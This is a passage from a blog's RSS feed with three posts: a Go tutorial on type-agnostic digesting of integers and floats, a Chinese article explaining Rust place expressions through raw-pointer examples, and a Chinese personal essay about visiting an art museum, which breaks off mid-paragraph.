class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {</span><br><span class="line">  fmt.Printf(<span class="hljs-string">&quot;%016x %x\n&quot;</span>, <span class="hljs-type">uint64</span>(<span class="hljs-number">42</span>), math.Float64bits(<span class="hljs-number">42.0</span>))</span><br><span class="line">  <span class="hljs-comment">// 000000000000002a 4045000000000000</span></span><br><span class="line">}</span><br></pre></div></div><h3 id="digesting">Digesting</h3><p ><strong>Digesting</strong> is a process that maps arbitary data into a fixed-length string, called a <strong>digest</strong>.</p><p >Digests are deterministic and discriminative. By deterministic, it means the same input data would always generate the same digest string. By discriminative, it means different input data would hopefully generate different digest strings. Though there will always be collisions, due to pigeonhole principle, modern digesting algorithms like SHA-256 are designed to minimize such probability, which effectively enables usage of digests in scenarios like data deduplication, data indexing, etc.</p><p >Modern digesting algorithms are byte-oriented. During the digesting process, one should first convert the input data into a byte sequence following a designated scheme, with which the algorithms like SHA-256 further calculate the digest string. The scheme one adopts should be carefully chosen, such that the resulting byte sequence faithfully reflects the information of the input data.</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="gk-section gk-zip zipped" data-gk-sid="BLOCK2.SEC1" data-gk-type="zip"><span class="line"><span class="hljs-keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> (</span><br><span class="line">  <span class="hljs-string">&quot;crypto/sha256&quot;</span></span><br><span class="line">  <span class="hljs-string">&quot;fmt&quot;</span></span><br><span class="line">  <span class="hljs-string">&quot;encoding/binary&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br></span><span class="line"></span><br><span class="line"><span class="hljs-keyword">type</span> Foo <span class="hljs-keyword">struct</span> {</span><br><span class="line">  A <span class="hljs-type">uint32</span></span><br><span class="line">  B <span class="hljs-type">string</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {</span><br><span class="line">  foo := Foo{<span class="hljs-number">42</span>, <span class="hljs-string">&quot;hello&quot;</span>}</span><br><span class="line">  h := sha256.New()</span><br><span class="line">  h.Write(binary.BigEndian.AppendUint32(<span class="hljs-literal">nil</span>, foo.A))</span><br><span class="line">  h.Write([]<span class="hljs-type">byte</span>(foo.B))</span><br><span class="line">  fmt.Printf(<span class="hljs-string">&quot;%x\n&quot;</span>, h.Sum(<span class="hljs-literal">nil</span>))</span><br><span class="line">}</span><br></pre></div></div><p >Above is a simple example of digesting a struct <code>Foo</code> using SHA-256 algorithm. The scheme here for byte-sequence generation is straightforward: we first encode the uint32 value <code>foo.A</code> with a 4-byte big-endian format, then append all bytes of string value <code>foo.B</code> to the end and finalize the byte sequence.</p><h3 id="type-leakage-in-digesting">Type Leakage in Digesting</h3><p >One might easily derive such a digesting scheme, which, however, could sometimes encode more information than what we expect.</p><p >The problem lies in the type information leakage. For the field <code>foo.A</code>, we not only encode the numeric value <code>42</code>, the way we encode it also reveals the type information of the field – the 4-byte length, the big-endian format, altogether constitutes the byte sequence. If later we switch to <code>int64</code> or <code>float32</code>, but keep encoding by their bit representation, the digest would change accordingly.</p><p >Well… this might frustrate our users, as most of them are unaware of the distinction between ints and floats. Imagine they enquire our application with the same set of parameters, only to find out resources exist yesterday are gone now, owing to an upgrade at midnight that modifies a field type. What a nightmare.</p><h3 id="the-problem-3">The Problem</h3><p >Thereby we have the cohesive digesting problem: how to properly calculate digests for numeric values, such that their types are not leaked into the digested results?</p><p >As said, the problem is equivalent to finding an type-agnostic <a href="https://en.wikipedia.org/wiki/Injective_function">injective</a> that converts numeric values to byte sequences. To simplify the problem, this post focuses on handling <code>uint64</code> and <code>float64</code> types, as they are the most generic numeric types in Go. Towards this goal, there are two possible solutions:</p><ol><li>Convert <code>uint64</code> and <code>float64</code> to some “super type” <code>X</code>, then convert <code>X</code> to byte sequence.</li><li>Develop respective dedicated schemes for <code>uint64</code> and <code>float64</code>.</li></ol><h2 id="attempt-1-find-super-type-x">Attempt 1: Find “Super Type” X</h2><p >The first idea is natural – we purge the type information by introducing a “super type” <code>X</code>. This type should be able to cover all possible values of <code>uint64</code> and <code>float64</code>, and should be able to convert between them without loss of information.</p><p >Considering integers are a subset of real nunbers, we are going to investigate two candidates: <code>float64</code> and <code>big.Float</code>.</p><h3 id="float64-as-super-type"><code>float64</code> as Super Type</h3><p >One might easily think of <code>float64</code> as the super type, as it has a wide value range of $-10^{308} \sim 10^{308}$, enough to cover all possible <code>uint64</code> values, likely.</p><p >This is however not true. In fact, the distribution of <code>float64</code>s becomes “sparse” when the value is large, due to limited precision. Only integers $\leq 2^{53}$ can be represented exactly in <code>float64</code>, while others larger are rounded to the nearest representable value. The following code snippet demonstrates that large integers are not well preserved when coerced into <code>float64</code>:</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {</span><br><span class="line">  <span class="hljs-built_in">println</span>(<span class="hljs-type">float64</span>(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">53</span>) == <span class="hljs-type">float64</span>(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">53</span>+<span class="hljs-number">1</span>)) <span class="hljs-comment">// true</span></span><br><span class="line">}</span><br></pre></div></div><p >Obviously, <code>float64</code> must be crossed out from the list.</p><h3 id="bigfloat-as-super-type"><code>big.Float</code> as Super Type</h3><p >If <code>float64</code> is not suitable, how about types with more precision?</p><p ><code>big.Float</code> is a handy type in Go that emulates arbitary precision floating-point numbers. One can tweak the precision with <code>(big.Float).SetPrec</code> to cover all possible <code>uint64</code> and <code>float64</code> values, then convert the value to a byte sequence.</p><div class="gk-code hljs" data-gk-id="BLOCK4"><div class="gk-code-display"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WriteUint64</span><span class="hljs-params">(v <span class="hljs-type">uint64</span>, h hash.Hash)</span></span> {</span><br><span class="line">  <span class="hljs-keyword">var</span> f big.Float</span><br><span class="line">  f.SetPrec(<span class="hljs-number">128</span>)</span><br><span class="line">  f.SetUint64(v)</span><br><span class="line">  b, _ := f.GobEncode()</span><br><span class="line">  h.Write(b)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WriteFloat64</span><span class="hljs-params">(v <span class="hljs-type">float64</span>, h hash.Hash)</span></span> {</span><br><span class="line">  <span class="hljs-keyword">var</span> f big.Float</span><br><span class="line">  f.SetPrec(<span class="hljs-number">128</span>)</span><br><span class="line">  f.SetFloat64(v)</span><br><span class="line">  b, _ := f.GobEncode()</span><br><span class="line">  h.Write(b)</span><br><span class="line">}</span><br></pre></div></div><p >Here we set the precision of <code>big.Float</code> to 128 bits, such that conversion from either <code>uint64</code> or <code>float64</code> to <code>big.Float</code> won’t be truncated. We then serialize the <code>big.Float</code> value using <code>GobEncode</code> method, which converts the value to a byte sequence.</p><p >This solution is neat, yet with several drawbacks:</p><ul><li><code>GobEncode</code> is designed for serialization, not digesting, with no guarantee for an injection between the values and the byte sequences (though it does for now).</li><li>It depends on the specific implementation of <code>GobEncode</code>, which might change in the future.</li><li>It cannot handle <code>Nan</code> values. <code>SetFloat64</code> would panic if the input is <code>Nan</code>. If that is a must, the solution is not applicable.</li><li>It is hard to replicate this solution in other languages. As <code>math/big</code> is unique to Go, other parts of the system written by different languages will struggle to align with this specific behavior.</li></ul><p >Of course, one could roll their own digesting scheme based on <code>big.Float</code>. I instead chose to develop a dedicated scheme for <code>uint64</code> and <code>float64</code>, as described in the next section.</p><h2 id="attempt-2-final-develop-dedicated-schemes">Attempt 2 (Final): Develop Dedicated Schemes</h2><p >To avoid the drawbacks of the first attempt, I have developed a customized scheme that cohesively maps number <code>x</code> to a 17-byte length sequence <code>b</code>. The scheme is designed as follows:</p><ul><li><code>b[0]</code> is the category flag. <code>b[0]</code> could be <code>0</code> (zero), <code>1</code> (positive), <code>2</code> (negative), <code>3</code> (positive inf), <code>4</code> (negative inf), <code>5</code> (Nan), indicating the characteristic of the digested number.</li><li>If x is zero or not finite (<code>b[0]</code> is <code>0, 3, 4, 5</code>),<ul><li>let <code>b[1:17]</code> be all zeros;</li></ul></li><li>If <code>x</code> is non-zero finite and <code>abs(x) &lt; 2^64</code>,<ul><li>let <code>b[1:9]</code> be the little-endian representation of <code>floor(abs(x))</code>,</li><li>let <code>b[9:17]</code> be the IEEE-754 representation of <code>frac(abs(x))</code>;</li></ul></li><li>If <code>x</code> is non-zero finite and <code>abs(x) &gt;= 2^64</code>,<ul><li><code>b[1:9]</code> being the IEEE-754 representation of <code>abs(x)</code>.</li><li>let <code>b[9:17]</code> be all zeros.</li></ul></li></ul><p >A reference implementation in Go is as follows (adapted from <a href="https://github.com/hsfzxjy/sdxtra/blob/490e641684d1482df475ef57bd491459cf9f8880/internal/dig/helper/helper.go">sdxtra/…/helper.go</a>):</p><div class="gk-code hljs" data-gk-id="BLOCK5"><div class="gk-code-display"><pre><span class="gk-section gk-zip zipped" data-gk-sid="BLOCK5.SEC1" data-gk-type="zip"><span class="line"><span class="hljs-keyword">const</span> (</span><br><span class="line">  zero     = <span class="hljs-number">0</span></span><br><span class="line">  positive = <span class="hljs-number">1</span></span><br><span class="line">  negative = <span class="hljs-number">2</span></span><br><span class="line">  inf      = <span class="hljs-number">3</span></span><br><span class="line">  neginf   = <span class="hljs-number">4</span></span><br><span class="line">  nan      = <span class="hljs-number">5</span></span><br><span class="line">)</span><br><span class="line"></span><br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WriteFloat64</span><span class="hljs-params">(x <span class="hljs-type">float64</span>, h hash.Hash)</span></span> {</span><br><span class="line">  buf := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">17</span>)</span><br><span class="line">  <span class="hljs-keyword">switch</span> {</span><br><span class="line">  <span class="hljs-keyword">case</span> x == <span class="hljs-number">0</span>:</span><br><span class="line">    buf[<span class="hljs-number">0</span>] = zero</span><br><span class="line">  <span class="hljs-keyword">case</span> math.IsInf(x, <span class="hljs-number">1</span>):</span><br><span class="line">    buf[<span class="hljs-number">0</span>] = inf</span><br><span class="line">  <span class="hljs-keyword">case</span> math.IsInf(x, <span class="hljs-number">-1</span>):</span><br><span class="line">    buf[<span class="hljs-number">0</span>] = neginf</span><br><span class="line">  <span class="hljs-keyword">case</span> math.IsNaN(x):</span><br><span class="line">    buf[<span class="hljs-number">0</span>] = nan</span><br><span class="line">  <span class="hljs-keyword">default</span>:</span><br><span class="line">    <span class="hljs-keyword">goto</span> NORMAL</span><br><span class="line">  }</span><br><span class="line">  h.Write(buf)</span><br><span class="line">  <span class="hljs-keyword">return</span></span><br><span class="line">NORMAL:</span><br><span class="line">  <span class="hljs-keyword">if</span> x &lt; <span class="hljs-number">0</span> {</span><br><span class="line">    buf[<span class="hljs-number">0</span>] = negative</span><br><span class="line">    x = -x</span><br><span class="line">  } <span class="hljs-keyword">else</span> {</span><br><span class="line">    buf[<span class="hljs-number">0</span>] = positive</span><br><span class="line">  }</span><br><span class="line">  i, f := math.Modf(x)</span><br><span class="line">  <span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">64</span> {</span><br><span class="line">    binary.LittleEndian.PutUint64(buf[<span class="hljs-number">1</span>:], <span class="hljs-type">uint64</span>(i))</span><br><span class="line">  } <span class="hljs-keyword">else</span> {</span><br><span class="line">    binary.LittleEndian.PutUint64(buf[<span class="hljs-number">1</span>:], math.Float64bits(x))</span><br><span class="line">  }</span><br><span class="line">  binary.LittleEndian.PutUint64(buf[<span class="hljs-number">9</span>:], math.Float64bits(f))</span><br><span class="line">  h.Write(buf)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WriteUint64</span><span class="hljs-params">(x <span class="hljs-type">uint64</span>, h hash.Hash)</span></span> {</span><br><span class="line">  buf := <span class="hljs-built_in">new</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">17</span>)</span><br><span class="line">  <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">0</span> {</span><br><span class="line">    buf[<span class="hljs-number">0</span>] = positive</span><br><span class="line">    binary.LittleEndian.PutUint64(buf[<span class="hljs-number">1</span>:], x)</span><br><span class="line">  }</span><br><span class="line">  h.Write(buf)</span><br><span class="line">}</span><br></pre></div></div><h2 id="discussion-on-the-scheme-and-implementation">Discussion on the Scheme and Implementation</h2><p >There are several points worth discussing about the final scheme and within the implementation:</p><h3 id="category-flag">Category Flag</h3><p >This scheme use the first byte to signify special values, which helps handle some quirky cases of IEEE-754 floating-point numbers, including:</p><ol><li><strong>Zeros</strong> IEEE-754 has both positive and negative zeros, which are different in bit representation but should be treated as the same value.</li><li><strong>Nans</strong> IEEE-754 has multiple representations for <code>Nan</code>, all of which should be treated as the same value during digesting.</li></ol><h3 id="short-path-for-uint64">Short-path for Uint64</h3><p >The scheme enables direct conversion from <code>uint64</code> to byte sequence, without the need to convert to <code>float64</code> first. This would save some computation and accelerate the digesting process.</p><h3 id="mathmodf"><code>math.Modf</code></h3><p >For some values, the scheme involves decomposition into their integral and fractional parts. This operation has several advantages:</p><ol><li>It forms an injection, that is, different <code>x</code> corresponds to different pair of <code>(floor(x), frac(x))</code>.</li><li>It can be implemented via bit operations in most programming languages, with promising efficiency and strong consistency.</li></ol><p >One can try to verify these properties by referring to IEEE-754 standards.</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Go/">Go</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Algorithm/">Algorithm</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Hashing/">Hashing</category>
      
      
      <comments>https://i.hsfzxjy.site/cohesive-digests-ints-and-floats/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Rust 中的隐匿概念 —— Place（位置）</title>
      <link>https://i.hsfzxjy.site/rust-place-expression/</link>
      <guid>https://i.hsfzxjy.site/rust-place-expression/</guid>
      <pubDate>Sun, 10 Nov 2024 04:35:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;在本文开始前，我们先看一个奇怪的问题。以下两个函数，为什么 &lt;code&gt;reborrow_good&lt;/code&gt; 能通过编译，而 &lt;code&gt;deref_bad&lt;/code&gt; 不能？&lt;/p&gt;
&lt;div class=&quot;gk-code hljs&quot; data-gk-id=&quot;BL</description>
        
      
      
      
      <content:encoded><![CDATA[<p >在本文开始前，我们先看一个奇怪的问题。以下两个函数，为什么 <code>reborrow_good</code> 能通过编译，而 <code>deref_bad</code> 不能？</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">reborrow_good</span>(p: *<span class="hljs-keyword">const</span> <span class="hljs-type">i32</span>) {</span><br><span class="line">    <span class="hljs-keyword">let</span> <span class="hljs-variable">_p</span> = &amp;raw <span class="hljs-keyword">const</span> *p;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref_bad</span>(p: *<span class="hljs-keyword">const</span> <span class="hljs-type">i32</span>) {</span><br><span class="line">    <span class="hljs-keyword">let</span> <span class="hljs-variable">_v</span> = *p;</span><br><span class="line">}</span><br></pre></div></div><p  class="par"></p><blockquote><p ><small><code>&amp;raw const B</code> 是 Rust 1.82 中引入的新语法，作用是创建一个指向 <code>B</code> 的 raw 指针。<br> 没有此语法前，为了获取指向 <code>x.y</code> 的 raw 指针，只能使用特殊宏 <code>addr_of!(x.y)</code>。而有了 <code>&amp;raw</code> 语法后便可写为 <code>&amp;raw const x.y</code>。</small></p></blockquote><p >使用 Edition 2024 的 Rust 编译器，<code>deref_bad</code> 会报如下错（<a href="https://play.rust-lang.org/?version=nightly&mode=debug&edition=2024&gist=28bad326389ea62631540a38741bb65c">Playground</a>），提示我们解引用 raw 指针需要在 unsafe block 中进行：</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line">error[E0133]: dereference of raw pointer is unsafe and requires unsafe block</span><br><span class="line"> --&gt; src/lib.rs:6:14</span><br><span class="line">  |</span><br><span class="line">6 |     let _v = *p;</span><br><span class="line">  |              ^^ dereference of raw pointer</span><br><span class="line">  |</span><br><span class="line">  = note: raw pointers may be null, dangling or unaligned; they can violate aliasing rules and cause data races: all of these are undefined behavior</span><br></pre></div></div><p >在 Rust 中，raw 指针相较引用，不受所有权规则的约束。它们可能传自其他语言，可能是空指针，可能没有对齐，可能有 alias 问题。因此，解引用 raw 指针需要在 unsafe 块中进行，而且要万分小心。</p><p >但这就奇怪了：明明 <code>reborrow_good</code> 的 <code>&amp;raw const *p</code> 中也有 <code>*p</code> 这一表达式，为什么它就能通过编译，而不需要 unsafe 呢？</p><h2 id="拆解表达式">拆解表达式</h2><p >为了解答以上问题，我们不妨从编译器视角出发，对两个例子作拆解分析，设想编译器是怎么生成对应的伪指令序列的。</p><h3 id="分析-reborrow_good">分析 reborrow_good</h3><p >首先来看 <code>_p = &amp;raw const *p</code> 这个表达式。</p><p ><code>p</code> 作为一个变量，它“不是一个值”。Rust 中的变量是对外部位置的一种抽象。一个变量可能对应 CPU 寄存器，也可能对应内存中的某个位置。为了知道变量里面的内容，我们先要 <strong>“读取”它</strong>，得到一个整数值。这一步可以记为 <code>$val0 := load p</code>。注意，我用带 <code>$</code> 前缀的 <code>$val0</code> 表示值，从而与 <code>p</code> 等位置作区分。</p><p >有了 <code>$val0</code> 这个值，下一步是对其应用 <code>*</code> 解引用运算。解引用相当于拿着一个代表地址的整数，去<strong>寻找对应的内存位置</strong>。因此这一步的结果是一个位置，而不是一个值，可以记为 <code>place0 := deref $val0</code>。</p><p >下一步是 <code>&amp;raw const</code> 操作，即取地址操作。取地址相当于以<strong>一个位置</strong>作为输入，输出一个代表其地址的整数值。这步可记为 <code>$val1 := addrof place0</code>。</p><p >最后，我们将 <code>$val1</code> 赋给 <code>_p</code>。这步可记为 <code>store _p $val1</code>。整个表达式的伪指令序列如下：</p><div class="gk-code hljs" data-gk-id="reborrow_good"><div class="gk-code-display"><pre><span class="line">$val0  :=   load  p</span><br><span class="line">place0 :=  deref  $val0</span><br><span class="line">$val1  := addrof  place0</span><br><span class="line">           store  _p     $val1</span><br></pre></div></div><h3 id="分析-deref_bad">分析 deref_bad</h3><p >我们再来看 <code>deref_bad</code> 中的 <code>_v = *p</code> 表达式。这其中也有 <code>*p</code> 一项，因此前两条伪指令与上面一样，分别是 <code>$val0 := load p</code> 与 <code>place0 := deref $val0</code>。</p><p >接下来，我们需要对 <code>_v</code> 变量赋值，而这个值是从 <code>place0</code> 中读取的，因此在 <code>store</code> 指令前，还需要一条 <code>load place0</code> 指令。最终，整个表达式的伪指令序列如下：</p><div class="gk-code hljs" data-gk-id="deref_bad"><div class="gk-code-display"><pre><span class="line">$val0  :=   load  p</span><br><span class="line">place0 :=  deref  $val0</span><br><span class="line">$val1  :=   load  place0</span><br><span class="line">           store  _v     $val1</span><br></pre></div></div><h3 id="对比分析">对比分析</h3><div class="gk-unified-code row" data-gk-style="row"><div class="gk-code hljs" data-gk-id="reborrow_good_recap" data-gk-title="reborrow_good"><div class="gk-code-display"><pre><span class="gk-section gk-include" data-gk-sid="reborrow_good_recap.SEC1" data-gk-type="include"data-gk-referee="reborrow_good"><span class="line">$val0  :=   load  p</span><br><span class="line">place0 :=  deref  $val0</span><br><span class="line">$val1  := addrof  place0</span><br><span class="line">           store  _p     $val1</span><br></span></pre></div></div><div class="gk-code hljs" data-gk-id="BLOCK3" data-gk-title="deref_bad"><div class="gk-code-display"><pre><span class="gk-section gk-include" data-gk-sid="BLOCK3.SEC1" data-gk-type="include"data-gk-referee="deref_bad"><span class="line">$val0  :=   load  p</span><br><span class="line">place0 :=  deref  $val0</span><br><span class="line">$val1  :=   load  place0</span><br><span class="line">           store  _v     $val1</span><br></span></pre></div></div></div><p >不难发现，两段序列的 不同之处在第三行：对于 <code>place0</code>，<code>reborrow_good</code> 使用了 <code>addrof</code>，而 <code>deref_bad</code> 使用了 <code>load</code>。这意味着<strong>后者会产生对 <code>place0</code> 位置的访问，而前者没有。</strong>由于 <code>place0</code> 源自 <code>*p</code>，Rust 推断出 <code>load place0</code> 是不安全的，因此拒绝编译 <code>deref_bad</code> 的代码。</p><h2 id="place（位置）">Place（位置）</h2><p >经过以上分析，我们不难发现，Rust 中存在一种抽象概念，即<strong>Place（位置）</strong>。一个 Place 即代表了一块外部世界的存储空间。</p><p >Place 这一概念在语言标准中没有提及，各大教程中也没有介绍，但它确确实实存在于 Rust 的世界观中。事实上，它存在于 MIR（Mid-level IR）。MIR 是 Rust 编译器的一种中间表示。从 Rust 到 MIR 再到汇编，抽象程度逐渐降低，与物理世界的契合逐步增加。于是，MIR 需要一个概念，指涉物理世界广泛存在的“储存空间”——这便是 Place。</p><h2 id="rust-中隐匿的-place-概念">Rust 中隐匿的 Place 概念</h2><p >Place 这一抽象始于低层的 MIR，却或多或少外溢到了高层的 Rust 中。然而 Rust 有意隐匿了这一抽象，进而造就了诸如 <code>reborrow_good</code>/<code>deref_bad</code> 合法性的困惑。</p><p >“解引用”一词常被理解为“寻址+读取”。但从上文的分析我们不难看出，表达式 <code>*p</code> 实则只通过“寻址”产生了一个 Place，而是否“读取”要看后续的操作，如在 <code>deref_bad</code> 中需要对 Place 取值再重赋值，这便涉及到了对 Place 的读取。Place 本身不会造成安全问题，即便其可能非法。真正带来安全隐患的是对 Place 的事实访问。</p><p ><code>*p</code> 产生一个 Place，因而也被称为 Place 表达式。除了 <code>*p</code>，还有其他一些常见的 Place 表达式，如单变量表达式 <code>x</code>，字段表达式 <code>x.y</code> 以及下标表达式 <code>x[y]</code> 等。对于 Place 表达式，我们可以进行“取址”、“读取”和“赋值”三种操作。“取址”和“赋值”分别对应 Rust 中的 <code>&amp;</code> 和 <code>=</code> 运算，但“读取”并没有类似的对应——Rust 会隐式地在合适的地方插入对 Place 的“读取”操作，淡化了这一步骤的重要性。</p><p >事实上，我们可以假想 Rust 中有个额外的 <code>load</code> 运算符。<code>load</code> 只能作用于 Place 之上，但编译器允许我们随意省略。在作类似分析时，为了看到问题的本质，我们可以显示加上省略的 <code>load</code>。还是以 <code>_p = &amp;raw const *p</code> 为例，加上 <code>load</code> 后变为：</p><div class="gk-code hljs" data-gk-id="BLOCK4"><div class="gk-code-display"><pre><span class="line">_p = &amp;raw <span class="hljs-keyword">const</span> *(load p)</span><br></pre></div></div><p >而 <code>_v = *p</code> 变为：</p><div class="gk-code hljs" data-gk-id="BLOCK5"><div class="gk-code-display"><pre><span class="line">_v = (load *(load p))</span><br></pre></div></div><p >如此一来，何处产生内存访问便一目了然。</p><hr><p >理解 Place，对于理解 Rust 中 Reborrow 等奇特概念，以及 unsafe 代码的编写，都有着重要的帮助。这些问题我会在后续博客中分析。</p><h2 id="参考">参考</h2><ul><li><a href="https://www.ralfj.de/blog/2024/08/14/places.html">What is a place expression?</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Rust/">Rust</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Compiler/">Compiler</category>
      
      
      <comments>https://i.hsfzxjy.site/rust-place-expression/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>美术馆</title>
      <link>https://i.hsfzxjy.site/2024-10-03-art-museum/</link>
      <guid>https://i.hsfzxjy.site/2024-10-03-art-museum/</guid>
      <pubDate>Fri, 11 Oct 2024 15:30:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;三号和她逛了美术馆。&lt;/p&gt;
&lt;p &gt;此前她已经来过一次，说这里面有好些标榜着“现代艺术”的新奇玩意儿，一个人逛完感觉要长脑子了。美术馆外的景观更是一绝，隔江远眺，对岸高楼参差，繁华尽收眼底，只可惜当时天气不好，灰蒙蒙的。但现在秋高气爽，天空湛蓝而清澈，再没比这更适合出游</description>
        
      
      
      
      <content:encoded><![CDATA[<p >三号和她逛了美术馆。</p><p >此前她已经来过一次，说这里面有好些标榜着“现代艺术”的新奇玩意儿，一个人逛完感觉要长脑子了。美术馆外的景观更是一绝，隔江远眺，对岸高楼参差，繁华尽收眼底，只可惜当时天气不好，灰蒙蒙的。但现在秋高气爽，天空湛蓝而清澈，再没比这更适合出游了。</p><p >我们都不是艺术爱好者，分不清这个主义那个 -ism，对于画作也仅限于“好看”和“不好看”两种评价，说不出个所以然。但这正好。</p><p >两个艺术爱好者逛美术馆，也许是场学术的刀光剑影。艺术爱好者和外行人逛美术馆，则是一路居高临下的压迫。而两个外行人逛美术馆，事情就变得有趣了起来。知识不一定学到了，但氛围一定是轻松的。我们无需担忧看不懂毕加索，或是猜不透桌子上的易拉罐想表达什么，甚至可以大肆嘲笑它们的丑陋，阔谈它们的荒诞。另一方不会在意，反倒乐在其中。</p><p >美术馆像是倒立的时间之矢。低层是现代的怪诞艺术，高层则是古代或近代的传统绘画。之前她从下往上逛，这次我们从上往下，这才是正确的时间顺序。</p><p >高层的画作中规中矩，属于我们认为“好看”的那类。最高层是中国的传统艺术。往下则是近现代中国对于新式绘画的尝试，上世纪初描绘国内人物风景的油画，革命年代的版画，以及体现建国后风貌的各种艺术形式。</p><p >比起传统艺术，我对新式绘画更有感觉，但最为特殊的还属版画。版画不像其他艺术动辄上米的巨幅，只有 B5 纸张的大小，甚至称得上袖珍。它也没有其他艺术般艳丽的色彩，多数只有黑色，或是少得可怜的几个色调。但这简陋的载体背后仿佛蕴藏着强大的生命力。</p><p >版画多描绘革命时期底层百姓的生活。田间耕作的老农，厂里洒汗的工人，残暴的侵略者，反抗的群众。版画是动态的，记录着挥锄的一刻，却让人洞见锄头落地的瞬间。版画是丰情的，老农疲惫麻木，工人屏息聚力，侵略者嚣张跋扈，反抗者视死如归。美术馆甚至展出了部分母版，那是画作的倒模。创作者制成母版，便可快速大批量印刷。版画袖珍，正好易于传播。因此在那个年代，版画是一种高效的宣传手段，即使是文盲也能被其感染。版画的灵魂不止于内容，还在那巴掌大的母版，饱经磨损的母版——这是人民的艺术。</p><p >相比之下，传统艺术的水墨画便没有如此触动。虽知道它所绘的是某处的山川秀景，隐约体会到蕴含的所谓意境，好看，但也仅限于此。我不知道它背后的故事，我离那个年代太远了。但新式绘画中竟也有些水墨画，一下却又有了别样的意味。这些水墨画绘的完全是现代事物，耸在田里的高压线塔，繁华初现的都市，或是同样是在山间，谷底却出现了大部开荒劳作的人。我感到亲切，因为其中有熟悉的事物。但水墨的形式又暗示我这应该是古代的，产生一种奇妙的疏离感。</p><p >这不禁让人思考：我们对艺术的接受，是因为其内容，还是因为其形式？</p><p >转到楼下，我们来到了抽象的领域，谈资也开始充盈起来。如果汤姆猫露出了我们看画时的表情，那他一定是看到扮成杰瑞的小象了。从这里开始，画面逐渐失真。一开始还能看得清轮廓，知道那大概是一个人。随后轮廓内开始扭曲，我虽知道那是人，却不愿承认，毕竟人真长这样是挺恐怖的。之后轮廓也开始消弭，逐渐分不清主体是什么。直到最后只剩下一些无意义的符号，几个方块，几笔线条，抑或是随意泼洒的油漆。与之一起的还有些装置艺术，桌子上一排的塑料瓶，地上一圈的陶片，甚至几个金属架子。让人摸不着头脑。</p><p >后面的这些东西也算是艺术？尽管不愿承认，它们却真实地展出在了这里。它们的背后或许有学者为其奋斗一生，形成某种高深莫测的理论，又凝练成牌子上匪夷所思的介绍词。它们的背后甚至有金主，开出我们一辈子也赚不到的天价。但至少从我们看来，它们不比落地窗外的蓝天更艺术，不比早前在非遗馆看到的一千二百八的卤鹅头更有价值——至少后者的香气充满了整栋楼，馋了我们一路。</p><p >话又说回来，我觉得还是圈子的问题。这些俗物乃至丑物，有人肯开出高价钱，有人肯将其供奉起来，说明至少有一个圈子是“认可”其价值的。这种“认可”不一定源于发自内心的对其“美”的肯定，也可能来自对其他圈子的拒绝。“认可这些艺术，你便是高雅/尊贵的人了。”有钱人只是有钱，他们又不傻。如果花一点钱能为自己打上“上流”的标签，那他们还是很乐意的。至于这些艺术背后的理论，或许确有其事。但如果没有人开高价接受这些艺术，这些艺术也不会成为主流，除非创作者本来就是有钱人——毕竟人总是要吃饭的。</p><p >这不免让我联想起网络上的“梗文化”。圈外人看到“鸡你太美”的衍生品，或许正如我们看到装置艺术般抽象、难以理解。但知道这个梗的人，即便只看到几个符号，看到篮球、中分乃至背带裤的色块，也能联想到这个梗，正如我们看版画时能联想到那个革命年代。一群人共同认同一个梗，便都是“自己人”了。成为“自己人”有许多好处，能形成更亲切的讨论氛围，或是带来利益交换（一键三连）。即便这个梗已被解构得支离破碎，只剩几个抽象元素，即便这个梗的原始含义已被遗忘，它仍是联结圈内人的纽带。</p><p >但意义的构建需要权威吗？倒也不见得。同样是一个装置艺术，一个圈子的人认为它有艺术价值，另一个圈子的人也可以觉得它没有价值，赋予它“废物”的意义，把它当成笑料、谈资或是反面教材。正如前面说过，艺术爱好者和外行人逛美术馆是聊不到一块的，他们的圈子不同，不认可彼此对艺术品的看法。两个艺术爱好者是同一个圈子的人，他们逛美术馆有共同的认知基础，可以就此展开严肃的讨论。而两个外行人，譬如我们，又何尝不是如此？我们觉得它们荒诞，无用，我们共同吐槽，形成了“外行人”的共识。</p><p 